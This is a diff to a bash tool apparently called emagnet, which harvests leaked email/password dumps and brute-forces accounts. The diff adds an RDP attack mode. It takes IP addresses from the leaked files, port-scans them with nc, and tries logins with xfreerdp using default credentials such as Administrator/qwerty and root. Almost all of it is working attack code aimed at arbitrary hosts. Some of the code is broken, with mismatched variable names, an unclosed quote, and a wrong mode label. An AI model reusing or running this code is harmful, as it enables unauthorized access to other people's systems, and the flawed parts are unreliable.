@@ -94,7 +94,7 @@ Usage: ./$basename$0 [--author] [--emagnet] [--option] .....
                       and store email addresses and passwords
                       in sorted day directories.
   -g, --bruteforce    Same as above '-e' with brute-force mode on
-                      - Available options: gmail/ssh/spotify/instagram
+                      - Available options: gmail/ssh/spotify/instagram/rdp
   -k, --kill          Kill emagnet ghost sessions
   -m, --merge         Merge all log files from incoming to archive
   -M, --move          Move all downloaded files to archive
@@ -170,6 +170,11 @@ emagnet_mustbefilled() {
   if [[ -z "$SSHPASS"        ]];then sed -i '183d' "$CONF";sed -i '183 i SSHPASS='                                                                                                                "$CONF";fi
   if [[ -z "$SSHTARGETS"     ]];then sed -i '184d' "$CONF";sed -i '184 i SSHTARGETS="$HOME/.config/emagnet/tmp/.emagnet-sshbruter.txt"'                                                           "$CONF";fi
   if [[ -z "$SSHPORTSCAN"    ]];then sed -i '185d' "$CONF";sed -i '185 i SSHPORTSCAN="$HOME/.config/emagnet/tmp/.emagnet-portscan.txt"'                                                           "$CONF";fi
+  if [[ -z "$RDPUSER"        ]];then sed -i '197d' "$CONF";sed -i '197 i RDPUSER="Administrator"'                                                                                                          "$CONF";fi
+  if [[ -z "$RDPPORT"        ]];then sed -i '198d' "$CONF";sed -i '198 i RDPPORT="3389"'                                                                                                            "$CONF";fi
+  if [[ -z "$RDPPASS"        ]];then sed -i '199d' "$CONF";sed -i '199 i RDPPASS="qwerty'                                                                                                         "$CONF";fi
+  if [[ -z "$RDPTARGETS"     ]];then sed -i '200d' "$CONF";sed -i '200 i RDPTARGETS="$HOME/.config/emagnet/tmp/.emagnet-rdpbruter.txt"'                                                           "$CONF";fi
+  if [[ -z "$RDPPORTSCAN"    ]];then sed -i '201d' "$CONF";sed -i '201 i RDPPORTSCAN="$HOME/.config/emagnet/tmp/.emagnet-portscan.txt"'                                                           "$CONF";fi
   if [[ -z "$USERAGENT"      ]];then sed -i '195d' "$CONF";sed -i '195 i USERAGENT=Mosaic/0.9'                                                                                                    "$CONF";fi
   if [[ -z "$ANDROID"        ]];then sed -i '204d' "$CONF";sed -i '204 i ANDROID=false'                                                                                                           "$CONF";fi
 }
@@ -394,6 +399,9 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
 	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
            printf "%17s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
+      elif [[ "$RBRUTEFORCE" = "true" ]]; then
+           printf "%20s \e[1;31mRDP\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
+           printf "%64s \n\n" | tr ' ' '='
 	  else
            sleep 0
 fi
@@ -429,6 +437,9 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
            printf "%64s \n\n" | tr ' ' '='
 	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
            printf "%17s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
+           printf "%64s \n\n" | tr ' ' '='
+      elif [[ "$RBRUTEFORCE" = "true" ]]; then
+           printf "%17s \e[1;31mRDP\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
 	  else
            sleep 0
@@ -481,6 +492,8 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
       	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
             sed -i '128d' "$CONF"
      	    sed -i '128 i IBRUTEFORCE=false' "$CONF"
+            sed -i '129d' "$CONF"
+     	    sed -i '129 i RBRUTEFORCE=false' "$CONF"     	    
             emagnet_conf
             printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
@@ -494,6 +507,8 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
      	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
             sed -i '128d' "$CONF"
      	    sed -i '128 i IBRUTEFORCE=false' "$CONF"
+            sed -i '129d' "$CONF"
+     	    sed -i '129 i RBRUTEFORCE=false' "$CONF" 
             emagnet_conf
             printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
@@ -507,10 +522,13 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
      	    sed -i '127 i PBRUTEFORCE=true' "$CONF"
             sed -i '128d' "$CONF"
      	    sed -i '128 i IBRUTEFORCE=false' "$CONF"
+            sed -i '129d' "$CONF"
+     	    sed -i '129 i RBRUTEFORCE=false' "$CONF" 
             emagnet_conf
             printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
+
 	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
 	        sed -i '125d' "$CONF"
      	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
@@ -520,6 +538,24 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
      	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
             sed -i '128d' "$CONF"
      	    sed -i '128 i IBRUTEFORCE=true' "$CONF"
+            sed -i '129d' "$CONF"
+     	    sed -i '129 i RBRUTEFORCE=false' "$CONF" 
+            emagnet_conf
+            printf "%20s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+            printf "\n%64s \n\n" | tr ' ' '='
+            emagnet_analyzer
+
+	  elif [[ "$RBRUTEFORCE" = "true" ]]; then
+	        sed -i '125d' "$CONF"
+     	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
+      	    sed -i '126d' "$CONF"
+     	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
+            sed -i '127d' "$CONF"
+     	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
+            sed -i '128d' "$CONF"
+     	    sed -i '128 i IBRUTEFORCE=false' "$CONF"
+            sed -i '129d' "$CONF"
+     	    sed -i '129 i RBRUTEFORCE=true' "$CONF" 
             emagnet_conf
             printf "%20s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
@@ -534,8 +570,59 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
             sed -i '127 i PBRUTEFORCE=false' "$CONF"
             sed -i '128d' "$CONF"
             sed -i '128 i IBRUTEFORCE=false' "$CONF"
+            sed -i '129d' "$CONF"
+            sed -i '129 i RBRUTEFORCE=false' "$CONF"
             emagnet_analyzer
 fi
+}
+
+emagnet_rdpbruter() {
+hash xfreerdp &> /dev/null
+( [[ $? -eq "0" ]] || echo -e "$basename$0: internal error -- xfreerdp is required to be installed"; exit 1 )
+emagnet_conf
+if [[ -z "$rdpPASS" ]]; then
+   echo -e "You must set a password to use during the attack"
+   read -p "Enter a password or hit enter for default (Default: root) " rdppassb
+   echo ""
+     if [[ -n "$rdppassb" ]]; then
+       sed -i '199d' "$CONF"
+       sed -i "199 i rdppassb=$rdppassb" "$CONF"
+     else
+       sed -i '199d' "$CONF"
+       sed -i "199 i RDPPASS=root" "$CONF"
+     fi
+fi
+
+SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*"
+grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
+|awk -F':' '{print $2}' \
+|sort \
+|awk -F, '!seen[$1]++' > "$RDPPORTSCAN"
+
+   if [[ $(cat $RDPPORTSCAN|wc -l) -lt "1" ]]; then
+        echo -e "                       - IPv4 Addresses Found \r             [\e[1;31m00\e[0m] "
+        sleep 2
+        else
+        echo -e "                       - IPv4 Addresses Found \r             [\e[1;32m$(cat $RDPPORTSCAN|wc -l)\e[0m] "
+        sleep 2
+        xargs -i -P $THREADS timeout 0.5 nc -zvn {} $EDPPORT < $RDPPORTSCAN 2>&1|awk '{print $3} /succeeded/ '|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $RDPTARGETS
+        echo -e "                       - Has Port $rdpPORT Open\r             [\e[1;32m$(cat $RDPPORTSCAN|wc -l)\e[0m] "
+        printf "\n%64s\n" | tr ' ' '='
+        printf "\n%15s";printf "BRUTE FORCING \e[1;31mRDP\e[0m TARGETS\e[0m\n\n"
+        sleep 2
+       while read line; do
+       #timeout 0.5
+         xfreerdp --ignore-certificate --authonly -u $RDP_USERNAME -p $RDP_PASSWORD $line &> test
+         cat test|grep -q "ERRCONNECT_SECURITY_NEGO_CONNECT_FAILED"
+            if [[ $? != "0" ]]; then
+              echo -e "[\e[1;32m>>\e[0m] - Cracked Password: $line"
+             else
+              echo -e "[\e[1;31m<<\e[0m] - Wrong Login: $line"
+            fi
+              sleep 4
+       done < $RDP_TARGETS
+   fi
+        sleep 4
 }
 
 emagnet_sshbruter() {
@@ -829,8 +916,8 @@ pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EM
                   printf "%17s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mI\e[0;32mL\E[1;31m\e[0m") ACCOUNTS\e[0m\n\n"
                   emagnet_gmail_bruter
                 elif [[ "$SBRUTEFORCE" = "true" ]]; then
-                  #printf "%64s \n\n" | tr ' ' '='
-                  #printf "%15s";printf "BRUTE FORCING -- \e[0;34mSSH\e[0m ACCOUNTS\e[0m\n\n"
+                  printf "%64s \n\n" | tr ' ' '='
+                  printf "%15s";printf "BRUTE FORCING -- \e[0;34mSSH\e[0m ACCOUNTS\e[0m\n\n"
                   emagnet_sshbruter
                 elif [[ "$PBRUTEFORCE" = "true" ]]; then
                   printf "%64s \n\n" | tr ' ' '='
@@ -840,6 +927,11 @@ pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EM
                   printf "%64s \n\n" | tr ' ' '='
                   printf "%14s";printf "BRUTE FORCING -- \e[0;33mINSTAGRAM\e[0m ACCOUNTS\e[0m\n\n"
                   emagnet_instagrambruter
+                elif [[ "$RBRUTEFORCE" = "true" ]]; then
+                  printf "%64s \n\n" | tr ' ' '='
+                  printf "%15s";printf "BRUTE FORCING -- \e[1;31mRDP\e[0m ACCOUNTS\e[0m\n\n"
+                  emagnet_rdpbruter
+
                 else
                   sleep 0
                fi
@@ -937,6 +1029,7 @@ case "${1}" in
      "-B"|"--banned"|"--blocked")
           emagnet_wasibanned
       ;;
+
      "emagnet"|"-e"|"-emagnet"|"--emagnet")
         emagnet_iconnection
         emagnet_first_run
@@ -944,6 +1037,7 @@ case "${1}" in
         sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' "$CONF"
         sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' "$CONF"
         sed -i 's/IBRUTEFORCE=true/IBRUTEFORCE=false/g' "$CONF"
+        sed -i 's/RBRUTEFORCE=true/RBRUTEFORCE=false/g' "$CONF"
         emagnet_run4ever
 		  ;;
 
@@ -952,6 +1046,7 @@ case "${1}" in
           sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' "$CONF"
           sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' "$CONF"
           sed -i 's/IBRUTEFORCE=true/IBRUTEFORCE=false/g' "$CONF"
+          sed -i 's/RBRUTEFORCE=true/RBRUTEFORCE=false/g' "$CONF"
           emagnet_iconnection
           emagnet_first_run
 
@@ -979,6 +1074,15 @@ case "${1}" in
               if [[ "$IBRUTEFORCE" = "true" ]]; then
                emagnet_run4ever
                emagnet_instagrambruter
+               mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
+              fi
+
+           elif [[ "$2" = "rdp" ]]; then
+           sed -i 's/RBRUTEFORCE=false/RBRUTEFORCE=true/g' "$CONF"
+           emagnet_conf
+              if [[ "$RBRUTEFORCE" = "true" ]]; then
+               emagnet_run4ever
+               emagnet_rdpbruter
                mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
               fi
 
